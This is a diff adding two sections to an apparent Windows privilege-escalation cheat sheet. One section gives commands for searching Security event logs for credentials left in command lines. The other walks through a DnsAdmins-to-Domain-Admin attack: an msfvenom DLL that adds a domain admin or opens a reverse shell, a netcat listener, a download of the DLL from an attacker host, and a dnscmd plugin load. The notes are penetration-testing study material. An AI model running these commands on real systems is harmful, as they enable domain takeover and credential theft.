@@ -350,6 +350,27 @@ PS C:\user> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=dom
 ```
 - *Note: We can also use [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) to copy the files*
 
+### Event log readers
+
+- `net localgroup "Event Log Readers"`
+- `wevtutil qe Security /rd:true /f:text | Select-String "/user"` search Security logs (credentials could be dropped this way)
+- `Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}` Another way to do the same thing
+- It is also worth to check PowerShell Operational logs
+
+### DnsAdmins
+
+- Using this group privileges, it is possible to use [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) to specify the path of a DLL plugin.
+- `Get-ADGroupMember -Identity DnsAdmins` to confirm group membership
+- `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll` we generate a dll with msfvenom that will add a user or we can make one that will get us a shell as admin `msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=4444 -f dll -o shell.dl`
+- Do not forget to launch a listener if you use the reverse shell `rlwrap nc -lnvp 4444`
+- Serve the dll using python web server `python3 -m http.server 80` 
+- Download the file in the target `wget "http://Attacking-machine-IP/adduser.dll" -outfile "adduser.dll"` (in powershell)  
+- `dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll` load custom dll (in CMD)  
+![image](https://user-images.githubusercontent.com/96747355/164776674-cd278ef1-2f02-456f-9038-2a37698c1efa.png)  
+- `sc stop dns` 
+- `sc start dns`
+- `net group "Domain Admins" /dom` check that we have the priv (or catch the shell)
+
 ## Resources
 
 {% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
@@ -363,3 +384,4 @@ PS C:\user> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=dom
 {% embed url="https://github.com/gtworek/Priv2Admin" %} Priv2Admin {% endembed %}  
 {% embed url="https://www.leeholmes.com/adjusting-token-privileges-in-powershell/" %} ADJUSTING TOKEN PRIVILEGES IN POWERSHELL - LEE HOLMES {% endembed %}  
 {% embed url="https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77" %} Enable All Token Privileges - Mark Mo{% endembed %}  
+{% embed url="https://adsecurity.org/?p=4064" %} From DNSAdmins to Domain Admin, When DNSAdmins is More than Just DNS Administration{% endembed %}  
